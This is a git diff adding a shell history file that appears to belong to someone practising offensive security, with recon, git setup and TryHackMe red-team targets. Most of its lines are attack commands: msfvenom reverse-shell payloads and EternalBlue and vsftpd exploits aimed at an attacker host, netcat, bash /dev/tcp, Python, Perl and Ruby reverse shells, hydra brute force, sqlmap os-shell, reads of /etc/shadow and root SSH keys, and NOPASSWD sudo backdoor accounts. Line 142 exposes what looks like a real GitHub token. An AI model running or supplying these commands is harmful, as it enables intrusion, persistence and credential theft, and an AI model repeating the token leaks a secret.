@@ -1,0 +1,235 @@
+1 git init
+2 echo "Hello, I'm cubby. Today is my first day~~"
+3 whois example.com
+4 dig example.com ANY
+5 dig example.com A
+6 dig example.com MX
+7 dig example.com NS
+8 dig example.com TXT
+9 host -a example.com
+10 curl ipinfo.io/8.8.8.8
+11 nslookup -type=MX example.com
+12 curl -I example.com
+13 nikto -h example.com
+14 python3 sherlock.py Felonius_Grr
+15 nslookup clinic.thmredteam.com
+16 recon-ng -w clinicredteam
+17 history
+18 hahahahaha
+19 badvillain
+20 traceroute thmredteam.com
+21 nmap -A -T4 -p- 10.10.208.110
+22 curl -l https://www.bugcrowd.com/bug-bounty-list/
+23 workspaces create clinicredteam
+24 recon-ng -w clinicredteam
+25 history
+26 git add .
+27 git commit -m "first commit"
+28 git branch -M main
+29 git remote add origin https://github.com/Dr0pbearsss/bounty.git
+30 git push -u origin main
+31 PAT=$(cat ~/.github_pat)
+32 curl -H "Authorization: token $PAT" https://api.github.com/user/repos
+33 shodan search "apache"
+34 nmap -sS -p- example.com
+35 tcpdump -i eth0 port 80
+36 wireshark
+37 sqlmap -u "http://example.com/page?param=1" --dbs
+38 msfconsole
+39 metasploit
+40 netcat -lvnp 4444
+41 nc -e /bin/bash 192.168.1.5 4444
+42 reverse_tcp_payload
+43 msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o payload.exe
+44 sysinfo
+45 hashdump
+46 netstat -ANY
+47 find / -perm -4000 2>/dev/null
+48 getcap -r / 2>/dev/null
+49 find / -type f -name '*.conf
+50 python3 -c 'import os; os.system("id")'
+51 smbclient -L //target_ip -U username
+52 smbmap -H target_ip -u username -p password
+53 enum4linux -a target_ip
+54 enum4linux -U target_ip
+55 msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o payload.exe
+56 python -c 'import pty; pty.spawn("/bin/bash")'
+57 reverse_tcp_payload
+58 netcat -z -v target_ip 1-65535
+59 ncat --proxy proxy_ip:proxy_port --proxy-auth username:password target_ip target_port
+60 curl -X PUT -d "data=value" http://example.com/vulnerable_endpoint
+61 hydra -L users.txt -P passwords.txt ssh://target_ip
+62 nmap -sS -p 22,80,443 target_ip
+63 nikto -h http://target_ip
+64 sqlmap -u "http://example.com/page?param=1" --dump --batch
+65 metasploit-framework
+66 msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set LHOST attacker_ip; set LPORT 4444; exploit'
+67 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf -o payload.elf
+68 msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set payload cmd/unix/reverse; set LHOST attacker_ip; set LPORT 4444; exploit'
+69 exploit -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444
+70 sqlmap -u "http://example.com/page?param=1" --os-shell
+71 curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=admin" http://example.com/login
+72 ldapsearch -x -H ldap://target_ip -b "dc=example,dc=com"
+73 smbmap -H target_ip -u username -p password
+74 bloodhound -d example.local -u username -p password -c all
+75 crackmapexec smb target_ip -u username -p password
+76 impacket-smbserver share ./files target_ip
+77 nmap -p 3389 --script rdp-enum-encryption target_ip
+78 hping3 -S -p 80 target_ip
+79 nc -w 5 -v target_ip 80
+80 metasploit -x 'use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set LHOST attacker_ip; set LPORT 4444; exploit'
+81 ike-scan -M target_ip
+82 nmap --script http-vuln-cve2006-3392 -p 80 target_ip
+83 nmap -p 21 --script ftp-anon target_ip
+84 curl -X DELETE http://example.com/vulnerable_endpoint
+85 smbclient //target_ip/share -U username
+86 smbget -R -A -U username //target_ip/share
+87 python3 -m http.server 8080
+88 sqlmap -u "http://example.com/page?param=1" --cookie="session=abcd1234"
+89 dirb http://example.com
+90 gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
+91 nikto -h http://target_ip -p 80
+92 crackmapexec smb target_ip -u username -p password -d domain --shares
+93 nmap -p 139,445 --script smb-os-discovery target_ip
+94 nmap -p 445 --script smb-enum-shares target_ip
+95 nmap -p 445 --script smb-enum-users target_ip
+96 msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set LHOST attacker_ip; set LPORT 4444; exploit'
+97 nmap -p 3389 --script rdp-enum-encryption target_ip
+98 nmap -p 3306 --script mysql-info target_ip
+99 hydra -L users.txt -P passwords.txt http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"
+100 ldapdomaindump -u username -p password -d example.local
+101 sudo useradd -m -G sudo newadmin
+102 sudo usermod -aG sudo newadmin
+103 sudo echo "newadmin:P@ssw0rd" | chpasswd
+104 sudo passwd newadmin
+105 sudo adduser newadmin
+106 sudo useradd -m -G sudo -s /bin/bash newadmin
+107 sudo echo "newadmin ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/newadmin
+108 sudo adduser newadmin sudo
+109 sudo useradd -m newadmin && sudo usermod -aG sudo newadmin
+110 sudo groupadd admin && sudo usermod -aG admin newadmin
+111 sudo useradd -m -G admin -s /bin/bash newadmin
+112 sudo mkdir -p /home/newadmin && sudo chown newadmin:newadmin /home/newadmin
+113 sudo usermod -aG wheel newadmin
+114 sudo groupadd sudo && sudo usermod -aG sudo newadmin
+115 echo "newadmin ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/newadmin
+116 sudo useradd -m -G admin -s /bin/bash -p $(openssl passwd -1 P@ssw0rd) newadmin
+117 git remote set-url origin https://github.com/Dr0pbearsss/repo.git
+118 curl -H "Authorization: token YOUR_PAT" https://api.github.com/user
+119 curl https://api.github.com/repos/octocat/Hello-World
+120 curl -H "Authorization: token YOUR_PAT" -X POST -d '{"query": "{ viewer { login } }"}' https://api.github.com/graphql
+121 msfconsole
+122 use exploit/windows/smb/ms17_010_eternalblue
+123 set RHOSTS 192.168.1.1
+124 exploit
+125 python -c 'import pty; pty.spawn("/bin/bash")'
+126 sudo netstat -tulnp
+127 sudo lsof -i
+128 sudo find / -name "*.pem"
+129 sudo grep -i 'private_key' /etc/ssh/sshd_config
+130 sudo grep 'root' /etc/passwd
+131 sudo cat /root/.ssh/id_rsa
+132 sudo chmod 600 /root/.ssh/id_rsa
+133 sudo ssh root@192.168.1.1
+134 sudo -i
+135 sudo -u root -H bash
+136 sudo -u root -s
+137 echo 'username ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+138 chmod 777 /path/to/important/file
+139 chown username:username /path/to/important/file
+140 setfacl -m u:username:rw /path/to/important/file
+141 getfacl /path/to/important/file
+142 curl -H "Authorization: token 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" https://api.github.com/rate_limit
+143 visudo
+144 sudo visudo -f /etc/sudoers
+145 cat /etc/sudoers
+146 cat /etc/sudoers.d/00_defaults
+147 grep -E 'user' /etc/sudoers
+148 awk -F: '{print $1}' /etc/passwd
+149 sudo grep 'root' /etc/shadow
+150 sudo cat /etc/shadow
+151 sudo less /var/log/auth.log
+152 sudo tail -n 50 /var/log/auth.log
+153 sudo tail -n 100 /var/log/secure
+154 sudo cat /var/log/secure
+155 sudo grep 'failed' /var/log/secure
+156 ssh -i /path/to/private_key username@target_ip
+157 ssh -p 2222 username@target_ip
+158 ssh -o "StrictHostKeyChecking no" username@target_ip
+159 ssh-keyscan -H target_ip >> ~/.ssh/known_hosts
+160 scp file.txt username@target_ip:/home/username/
+161 scp -P 2222 file.txt username@target_ip:/home/username/
+162 rsync -avz /local/path username@target_ip:/remote/path
+163 rsync -avz -e "ssh -p 2222" /local/path username@target_ip:/remote/path
+164 netcat -v -e /bin/bash target_ip 1234
+165 nc -l -p 1234 -e /bin/bash
+166 nc -lvnp 4444
+167 nc -lvp 5555 -e /bin/bash
+168 ncat -C -e /bin/bash target_ip 6666
+169 ncat -C -l -p 7777 -e /bin/bash
+170 python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("target_ip", 8888)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash"]);'
+171 python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("target_ip", 9999)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash"]);'
+172 bash -i >& /dev/tcp/target_ip/12345 0>&1
+173 bash -i >& /dev/tcp/target_ip/54321 0>&1
+174 perl -e 'use Socket;$i="target_ip";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"<&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+175 perl -e 'use IO::Socket::INET; my $sock = IO::Socket::INET->new(PeerAddr => "target_ip", PeerPort => 1234, Proto => "tcp") or die "Socket could not be created!"; open(STDIN, "<&", $sock); open(STDOUT, ">&", $sock); open(STDERR, ">&", $sock); exec("/bin/sh -i");'
+176 ruby -rsocket -e 'eval "require 'socket'; s=TCPSocket.new('target_ip', 1234); while(cmd=s.gets); IO.popen(cmd, err[:out] = true); s.print IO.popen(cmd, err[:out] = true).read; end"'
+177 ruby -e 'require "socket"; socket = TCPSocket.new("target_ip", 1234); while line = socket.gets; IO.popen(line, "r") { |io| socket.print io.read } end'
+178 java -cp /path/to/remote_shell.jar com.example.RemoteShell target_ip 1234
+179 java -cp /path/to/remote_shell.jar com.example.RemoteShell -host target_ip -port 1234
+180 telnet target_ip 1234
+181 telnet target_ip 5555
+182 ftp target_ip
+183 ftp target_ip 21
+184 nc -zv target_ip 1-1024
+185 nc -vz target_ip 80
+186 nmap -p 80,443 target_ip
+187 nmap -p 22,80,443 --open target_ip
+188 nmap -p- target_ip
+189 nmap -A target_ip
+190 nmap -T4 -A -p- target_ip
+191 msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe -o /tmp/evil.exe
+192 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=your_ip LPORT=5555 -f elf -o /tmp/evil.elf
+193 msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST your_ip; set LPORT 4444; exploit"
+194 msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST your_ip; set LPORT 5555; exploit"
+195 msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=6666 -o /tmp/evil.apk
+196 msfconsole -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST your_ip; set LPORT 6666; exploit"
+197 open -a Terminal target_ip
+198 open -a Terminal --args "target_ip"
+199 echo "payload" | base64 -d | bash
+200 echo "payload" | base64 -d | sh
+201 curl -X POST -H "Content-Type: application/json" -d '{"command": "ls -la"}' http://target_ip:8080/command
+202 curl -X GET http://target_ip:8080/commands
+203 wget http://target_ip:8080/file.txt
+204 curl -O http://target_ip:8080/file.txt
+205 ssh-keygen -t rsa -b 2048 -f /home/username/.ssh/id_rsa
+206 ssh-copy-id -i /home/username/.ssh/id_rsa.pub username@target_ip
+207 ssh -o "StrictHostKeyChecking=no" username@target_ip
+208 scp -i /home/username/.ssh/id_rsa /local/path/file.txt username@target_ip:/remote/path/
+209 rsync -e "ssh -i /home/username/.ssh/id_rsa" /local/path username@target_ip:/remote/path
+210 telnet target_ip 21
+211 ftp -n target_ip <<END_SCRIPT
+user username password
+binary
+get file.txt
+bye
+END_SCRIPT
+21s2 sshpass -p 'password' ssh username@target_ip
+213 sshpass -p 'password' scp file.txt username@target_ip:/home/username/
+214 sshpass -p 'password' rsync -avz /local/path username@target_ip:/remote/path
+215 sshpass -p 'password' ssh -o StrictHostKeyChecking=no username@target_ip
+216 nc -lvp 8888
+217 nc -e /bin/bash -l 8888
+218 nmap -sV --script=banner target_ip
+219 nmap -sV --script=vuln target_ip
+220 smbclient -L //target_ip -U username
+221 smbclient //target_ip/share -U username
+222 rpcclient -U username target_ip
+223 crackmapexec smb target_ip -u username -p password
+224 crackmapexec smb target_ip -u username -p password --shares
+225 crackmapexec smb target_ip -u username -p password --sessions
+226 enum4linux -a target_ip
+227 enum4linux -u username -p password target_ip
+228 smbmap -H target_ip -u username -p password
+229 smbmap -H target_ip -u username -p password -R
+230 smbmap -H target_ip -u username -p password -r /share
